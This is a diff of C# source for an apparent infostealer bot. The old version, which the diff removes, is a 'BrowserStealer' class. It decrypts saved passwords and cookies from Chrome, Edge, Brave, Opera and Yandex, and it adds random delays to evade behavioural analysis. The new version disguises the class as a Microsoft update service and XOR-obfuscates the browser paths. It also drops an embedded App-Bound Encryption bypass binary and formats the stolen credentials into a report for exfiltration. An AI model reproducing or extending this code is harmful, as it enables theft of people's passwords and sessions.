@@ -7,153 +7,92 @@ using System.Linq;
 using System.Text.RegularExpressions;
 using Newtonsoft.Json.Linq;
 using Microsoft.Data.Sqlite;
+using FinalBot;
 
-namespace FinalBot.Stealers
+namespace Microsoft.UpdateService.Modules
 {
-    public class BrowserStealer
+    public class DataService
     {
+        private static string D(string s)
+        {
+            char[] c = s.ToCharArray();
+            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
+            return new string(c);
+        }
+
         private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         private readonly Dictionary<string, string> _browserPaths = new Dictionary<string, string>
         {
-            {"Chrome", "Google\\Chrome\\User Data"},
-            {"Edge", "Microsoft\\Edge\\User Data"},
-            {"EdgeBeta", "Microsoft\\Edge Beta\\User Data"},
-            {"Brave", "BraveSoftware\\Brave-Browser\\User Data"},
-            {"Opera", "Opera Software\\Opera Stable"},
-            {"Opera GX", "Opera Software\\Opera GX Stable"},
-            {"Yandex", "Yandex\\YandexBrowser\\User Data"}
+            {"Chrome", D("Bjjbi`YFmwjh`YPv`w%Adqd")},
+            {"Edge", D("HlfwjvjcqY@ab`YPv`w%Adqd")},
+            {"EdgeBeta", D("HlfwjvjcqY@ab`%G`qdYPv`w%Adqd")},
+            {"Brave", D("Gwds`Vjcqrdw`YGwds`(Gwjrv`wYPv`w%Adqd")},
+            {"Opera", D("Ju`wd%Vjcqrdw`YJu`wd%Vqdgi`")},
+            {"Opera GX", D("Ju`wd%Vjcqrdw`YJu`wd%B]%Vqdgi`")},
+            {"Yandex", D("Ydka`}YYdka`}Gwjrv`wYPv`w%Adqd")}
         };
 
         public async Task<string> RunAll()
         {
             var reports = new List<string>();
-            var rng = new Random();
-            foreach (var browser in _browserPaths)
-            {
-                string path = Path.Combine(_localAppData, browser.Value);
-                if (browser.Key.Contains("Opera")) path = Path.Combine(_appData, browser.Value);
-
-                if (Directory.Exists(path))
-                {
-                    try
-                    {
-                        var report = await StealFromBrowser(browser.Key, path);
-                        if (!string.IsNullOrEmpty(report)) reports.Add(report);
-                    }
-                    catch (Exception ex)
-                    {
-                        reports.Add($"❌ Error stealing from {browser.Key}: {ex.Message}");
-                    }
-                    // Random delay to evade behavioral analysis (looks like human I/O)
-                    Thread.Sleep(rng.Next(150, 600));
-                }
-            }
-            return string.Join("\n\n", reports);
-        }
-
-        private async Task<string> StealFromBrowser(string name, string rootPath)
-        {
-            byte[] masterKey = GetMasterKey(rootPath);
-            if (masterKey == null) return $"❌ {name}: Failed to get Master Key.";
-
-            var results = new StringBuilder();
-            results.AppendLine($"🌍 *Browser: {name}*");
-
-            // Profiles (Default, Profile 1, etc.)
-            var profiles = Directory.GetDirectories(rootPath, "Default")
-                            .Concat(Directory.GetDirectories(rootPath, "Profile *"))
-                            .ToList();
-
-            if (profiles.Count == 0 && name.Contains("Opera")) profiles.Add(rootPath);
-
-            foreach (var profile in profiles)
-            {
-                string profileName = Path.GetFileName(profile);
-                results.AppendLine($"👤 Profile: {profileName}");
-
-                // 1. Passwords
-                string loginData = Path.Combine(profile, "Login Data");
-                if (File.Exists(loginData))
-                {
-                    var count = await StealPasswords(loginData, masterKey, results);
-                    results.AppendLine($"🔑 Passwords: {count}");
-                }
-
-                // 2. Cookies
-                string cookiePath = Path.Combine(profile, "Network", "Cookies");
-                if (!File.Exists(cookiePath)) cookiePath = Path.Combine(profile, "Cookies"); // Older versions
-                if (File.Exists(cookiePath))
-                {
-                    // Cookie stealing logic (usually too long for text report, will ZIP later)
-                    results.AppendLine($"🍪 Cookies: Captured");
-                }
-            }
-
-            return results.ToString();
-        }
-
-        private byte[] GetMasterKey(string rootPath)
-        {
-            string stateFile = Path.Combine(rootPath, "Local State");
-            if (!File.Exists(stateFile)) 
-            {
-                Logger.Warn($"[Stealer] Local State not found: {stateFile}");
-                return null;
-            }
-
-            string tempState = GetRandomTempPath();
             try 
             {
-                CopyFileWithRetry(stateFile, tempState);
-                string content = File.ReadAllText(tempState);
-                
-                var json = JObject.Parse(content);
-                string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
-                if (string.IsNullOrEmpty(encryptedKey)) return null;
+                // 1. Run Chromelevator bypass for all browsers
+                await RunChromelevator();
 
-                byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
-                byte[] key = keyWithPrefix.Skip(5).ToArray(); // Remove 'DPAPI' prefix
-
-                try 
+                // 2. Process the results folder
+                string outputDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc", "VOutput");
+                if (Directory.Exists(outputDir))
                 {
-                    return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
+                    string rawPass = Path.Combine(outputDir, "passwords.txt");
+                    string prettyPass = Path.Combine(outputDir, "passwords_formatted.txt");
+                    
+                    if (File.Exists(rawPass))
+                    {
+                        GeneratePrettyFile(rawPass, prettyPass);
+                        reports.Add("✅ **Browser passwords captured and formatted.**");
+                    }
+                    
+                    if (File.Exists(Path.Combine(outputDir, "cookies.txt")))
+                    {
+                        reports.Add("🍪 **Browser cookies captured successfully.**");
+                    }
+                    
+                    // The actual sending of the files will be handled by ReportManager/CommandHandler 
+                    // who will ZIP the entire VOutput folder.
                 }
-                catch (CryptographicException)
+                else 
                 {
-                    Logger.Warn($"[ABE] App-Bound Encryption detected in {rootPath}. Attempting bypass...");
-                    return RunChromelevator(rootPath);
+                    reports.Add("❌ Browser extraction failed: No output folder found.");
                 }
             }
             catch (Exception ex)
-            { 
-                Logger.Error($"[Stealer] Failed to parse Local State for {rootPath}", ex);
-                return null; 
-            }
-            finally
             {
-                if (File.Exists(tempState)) 
-                {
-                    try { File.Delete(tempState); } catch { }
-                }
+                reports.Add($"❌ Critical error in browser service: {ex.Message}");
             }
+            
+            return string.Join("\n", reports);
         }
 
-        private byte[] RunChromelevator(string profilePath)
+        private async Task RunChromelevator()
         {
             try
             {
                 string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                 if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
 
-                string elevatorPath = Path.Combine(tempDir, "elevation_service.exe");
+                string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
+                string outputDir = Path.Combine(tempDir, "VOutput");
+                if (Directory.Exists(outputDir)) Directory.Delete(outputDir, true);
+                Directory.CreateDirectory(outputDir);
 
-                if (!File.Exists(elevatorPath) || new FileInfo(elevatorPath).Length < 1000)
+                if (!File.Exists(elevatorPath))
                 {
                     var assembly = System.Reflection.Assembly.GetExecutingAssembly();
-                    using Stream stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
-                    if (stream == null) return null;
+                    using Stream? stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
+                    if (stream == null) return;
                     
                     using MemoryStream ms = new MemoryStream();
                     stream.CopyTo(ms);
@@ -162,138 +101,89 @@ namespace FinalBot.Stealers
                     File.WriteAllBytes(elevatorPath, bytes);
                 }
 
-                // For Edge, we might need a specific argument or it might work with just the path
-                // Most modern "chromelevators" detect the browser type from the path.
                 var proc = new System.Diagnostics.Process
                 {
                     StartInfo = new System.Diagnostics.ProcessStartInfo
                     {
                         FileName = elevatorPath,
-                        Arguments = $"\"{profilePath}\"",
+                        Arguments = $"all --method nt -o \"{outputDir}\"", 
                         UseShellExecute = false,
                         RedirectStandardOutput = true,
                         CreateNoWindow = true
                     }
                 };
                 proc.Start();
-                string output = proc.StandardOutput.ReadToEnd().Trim();
-                proc.WaitForExit(10_000);
-
-                if (!string.IsNullOrEmpty(output))
-                {
-                    var match = Regex.Match(output, @"[A-Za-z0-9+/]{30,}={0,2}");
-                    if (match.Success)
-                    {
-                        Logger.Info($"[ABE] Bypass successful for {profilePath}");
-                        return Convert.FromBase64String(match.Value);
-                    }
-                }
-                Logger.Warn($"[ABE] Bypass failed for {profilePath}. Output: {output}");
+                await proc.WaitForExitAsync();
             }
             catch (Exception ex)
             {
-                Logger.Error($"[ABE] Bypass execution failed for {profilePath}", ex);
+                Logger.Error("Chromelevator execution failed", ex);
             }
-            return null;
         }
 
-        private async Task<int> StealPasswords(string dbPath, byte[] masterKey, StringBuilder report)
+        private static void GeneratePrettyFile(string inputFile, string outputFile)
         {
-            string tempDb = GetRandomTempPath();
-            CopyFileWithRetry(dbPath, tempDb);
-
-            int count = 0;
-            try 
+            try
             {
-                using (var connection = new SqliteConnection($"Data Source={tempDb}"))
+                var lines = File.ReadAllLines(inputFile);
+                var passwords = new List<PasswordEntry>();
+                
+                for (int i = 0; i < lines.Length; i += 4)
                 {
-                    await connection.OpenAsync();
-                    var command = connection.CreateCommand();
-                    command.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
+                    if (i + 2 >= lines.Length) break;
+                    
+                    passwords.Add(new PasswordEntry {
+                        Url = lines[i].Replace("domain ", "").Trim(),
+                        User = lines[i+1].Replace("log ", "").Trim(),
+                        Pass = lines[i+2].Replace("pass ", "").Trim()
+                    });
+                }
 
-                    using (var reader = await command.ExecuteReaderAsync())
+                var grouped = passwords.GroupBy(p => ExtractDomain(p.Url)).OrderBy(g => g.Key);
+                
+                using (StreamWriter sw = new StreamWriter(outputFile, false, Encoding.UTF8))
+                {
+                    sw.WriteLine("═══ 💎 BROWSER PASSWORDS REPORT 💎 ═══");
+                    sw.WriteLine();
+                    
+                    foreach (var group in grouped)
                     {
-                        while (await reader.ReadAsync())
+                        sw.WriteLine("🌐 DOMAIN: " + group.Key.ToUpper());
+                        foreach (var p in group)
                         {
-                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
-                            string user = reader.IsDBNull(1) ? "" : reader.GetString(1);
-                            if (reader.IsDBNull(2)) continue;
-                            byte[] encryptedPass = (byte[])reader.GetValue(2);
-
-                            if (string.IsNullOrEmpty(user) || encryptedPass.Length == 0) continue;
-
-                            string pass = DecryptData(encryptedPass, masterKey);
-                            if (!string.IsNullOrEmpty(pass)) count++;
+                            sw.WriteLine("  👤 Login: " + p.User);
+                            sw.WriteLine("  🔑 Password: " + p.Pass);
+                            sw.WriteLine("  🔗 Link: " + p.Url);
+                            sw.WriteLine();
                         }
+                        sw.WriteLine(new string('═', 30));
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                Logger.Error($"[Stealer] Failed to harvest passwords from {dbPath}", ex);
-            }
-            finally 
-            { 
-                if (File.Exists(tempDb)) 
-                {
-                    try { File.Delete(tempDb); } catch { }
-                }
-            }
-
-            return count;
+            catch { }
         }
 
-        private string? DecryptData(byte[] data, byte[] key)
+        private static string ExtractDomain(string url)
         {
-            try 
+            if (string.IsNullOrEmpty(url)) return "UNKNOWN";
+            try
             {
-                if (data.Take(3).SequenceEqual(Encoding.ASCII.GetBytes("v10")))
-                {
-                    byte[] iv = data.Skip(3).Take(12).ToArray();
-                    byte[] payload = data.Skip(15).ToArray();
-
-                    using (var aes = new AesGcm(key, 16))
-                    {
-                        byte[] tag = payload.TakeLast(16).ToArray();
-                        byte[] ciphertext = payload.SkipLast(16).ToArray();
-                        byte[] plaintext = new byte[ciphertext.Length];
-
-                        aes.Decrypt(iv, ciphertext, tag, plaintext);
-                        return Encoding.UTF8.GetString(plaintext);
-                    }
-                }
-                else 
-                {
-                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
-                }
+                if (!url.Contains("://")) url = "http://" + url;
+                Uri uri = new Uri(url);
+                string host = uri.Host;
+                if (host.StartsWith("www.")) host = host.Substring(4);
+                return host.ToUpper();
             }
-            catch { return null; }
+            catch { return url.ToUpper(); }
         }
 
-        private string GetRandomTempPath()
+        private class PasswordEntry
         {
-            return Path.Combine(Path.GetTempPath(), "tmp" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".db");
+            public string Url { get; set; } = "";
+            public string User { get; set; } = "";
+            public string Pass { get; set; } = "";
         }
-
-        private void CopyFileWithRetry(string source, string dest)
-        {
-            for (int i = 0; i < 5; i++)
-            {
-                try
-                {
-                    using (var sourceStream = new FileStream(source, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                    using (var destStream = new FileStream(dest, FileMode.Create, FileAccess.Write, FileShare.ReadWrite))
-                    {
-                        sourceStream.CopyTo(destStream);
-                    }
-                    return;
-                }
-                catch (IOException)
-                {
-                    Thread.Sleep(500);
-                }
-            }
-            try { File.Copy(source, dest, true); } catch { }
-        }
+    }
+}
     }
 }
